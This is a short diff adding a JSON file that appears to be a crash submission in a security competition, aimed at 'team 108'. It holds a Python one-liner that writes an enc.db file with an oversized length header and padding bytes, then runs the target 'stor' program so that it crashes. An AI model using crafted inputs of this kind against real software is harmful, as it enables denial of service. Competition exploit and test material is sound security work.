@@ -1,0 +1,8 @@
+{
+  "target_team": 108,
+  "type": "crash",
+  "commands": [
+    "python3 -c \"open('enc.db','wb').write((268435456).to_bytes(4,'little') + b'A'*304)\"",
+    "./stor -u crashuser -k crashkey register"
+  ]
+}
